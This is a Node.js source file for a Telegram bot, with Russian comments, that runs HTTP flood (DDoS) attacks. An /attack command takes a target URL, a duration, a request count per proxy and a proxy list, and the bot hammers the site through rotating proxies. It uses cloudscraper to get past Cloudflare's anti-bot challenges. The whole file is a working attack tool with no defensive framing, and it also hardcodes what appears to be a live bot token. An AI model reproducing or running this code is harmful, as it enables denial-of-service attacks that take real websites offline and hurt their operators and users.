const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const CloudScraper = require('cloudscraper');

// Замените 'YOUR_TELEGRAM_BOT_TOKEN' на фактический токен вашего бота, полученный от BotFather
const botToken = '6173423738:AAHgw-Fv3cPVWOpdz19m8n0TfSWf99PI6c4';
const bot = new TelegramBot(botToken, { polling: true });

let attackInterval = null;
let isAttackStarted = false; // Флаг, указывающий, была ли уже запущена атака

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
  Добро пожаловать в бота!

  Введите /stop, чтобы остановить атаку.
  
  Введите /start чтобы пользоваться ботом

  Чтобы начать атаку, используйте следующую команду:
  /attack <url> <time> <req_per_ip> <proxies>

  Пример:
  /attack http://example.com 60 100 proxy.txt

  Убедитесь, что вы предоставляете требуемые параметры: URL, время, req_per_ip и proxies.
  `;
  bot.sendMessage(chatId, message);
});

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const commandParams = match[1].split(' ');

  if (commandParams.length !== 4) {
    const message = 'Неверная команда! Пожалуйста, укажите требуемые параметры: URL, время, req_per_ip и proxies.';
    bot.sendMessage(chatId, message);
    return;
  }

  if (isAttackStarted) {
    const message = 'Атака уже запущена!';
    bot.sendMessage(chatId, message);
    return;
  }

  const target = commandParams[0];
  const time = parseInt(commandParams[1]);
  const req_per_ip = parseInt(commandParams[2]);
  const proxiesFilePath = commandParams[3];

  let proxies = readFileIfExists(proxiesFilePath);

  if (proxies.length === 0) {
    const message = 'Ошибка при чтении файла с прокси.';
    bot.sendMessage(chatId, message);
    return;
  }

  attackInterval = setInterval(sendReq, 1000);
  isAttackStarted = true; // Устанавливаем флаг, что атака запущена

  setTimeout(() => {
    clearInterval(attackInterval);
    isAttackStarted = false; // Сбрасываем флаг после окончания атаки
    const message = 'Атака завершена.';
    bot.sendMessage(chatId, message);
  }, time * 1000);

  function sendReq() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
      CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: 'http://' + proxy,
        challengesToSolve: 10
      }, function (error, response) {
        if (error) {
          let obj_v = proxies.indexOf(proxy);
          proxies.splice(obj_v, 1);
          return console.log(error.message);
        }
        resolve(response.request.headers);
      });
    });

    getHeaders.then(function (result) {
      for (let i = 0; i < req_per_ip; ++i) {
        CloudScraper({
          uri: target,
          headers: result,
          proxy: 'http://' + proxy,
          followAllRedirects: false
        }, function (error, response) {
          if (error) {
            console.log(error.message);
          }
        });
      }
    });
  }
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  clearInterval(attackInterval);
  isAttackStarted = false; // Сбрасываем флаг при остановке атаки
  const message = 'Атака остановлена.';
  bot.sendMessage(chatId, message);
});

// Обработка необработанных исключений и отклоненных обещаний
process.on('uncaughtException', function (err) {
  console.log(err);
});
process.on('unhandledRejection', function (err) {
  console.log(err);
});

// Проверка существования файла перед его чтением
function readFileIfExists(filePath) {
  try {
    if (fs.existsSync(filePath)) {
      return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
    }
  } catch (error) {
    console.error('Ошибка при чтении файла:', error);
  }
  return [];
}
